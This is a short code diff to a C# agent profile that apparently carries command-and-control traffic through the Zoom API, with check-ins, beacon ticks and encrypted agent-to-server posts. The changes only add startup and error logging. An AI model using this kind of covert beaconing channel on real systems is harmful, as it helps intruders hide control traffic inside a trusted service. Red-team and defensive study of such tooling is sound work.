@@ -76,6 +76,14 @@ namespace Agent.Profiles
                    );
             this._client = new HttpClient(handler);
             this._client.Timeout = TimeSpan.FromSeconds(30);
+
+            // Startup self-check: surfaces whether build-time substitution happened.
+            Console.Error.WriteLine($"[zoom] profile loaded | " +
+                $"account_id={(accountId == "account_id" ? "<UNSUBSTITUTED>" : "set(len=" + accountId.Length + ")")} | " +
+                $"client_id={(clientId == "client_id" ? "<UNSUBSTITUTED>" : "set(len=" + clientId.Length + ")")} | " +
+                $"client_secret={(clientSecret == "client_secret" ? "<UNSUBSTITUTED>" : "set(len=" + clientSecret.Length + ")")} | " +
+                $"channel_id={(channelId == "channel_id" ? "<UNSUBSTITUTED>" : "set(len=" + channelId.Length + ")")} | " +
+                $"api_base={apiBase} | oauth_base={oauthBase}");
         }
 
         // ===================== Zoom REST API =====================
@@ -349,8 +357,9 @@ namespace Agent.Profiles
             {
                 await PostEncrypted(DIR_AGENT_TO_SERVER, encrypted);
             }
-            catch
+            catch (Exception e)
             {
+                Console.Error.WriteLine($"[zoom] checkin post failed: {e}");
                 return new CheckinResponse() { status = "failed" };
             }
 
@@ -379,8 +388,9 @@ namespace Agent.Profiles
                     await PostEncrypted(DIR_AGENT_TO_SERVER, encrypted);
                     this.currentAttempt = 0;
                 }
-                catch (Exception)
+                catch (Exception e)
                 {
+                    Console.Error.WriteLine($"[zoom] beacon tick failed: {e}");
                     this.currentAttempt++;
                 }
 
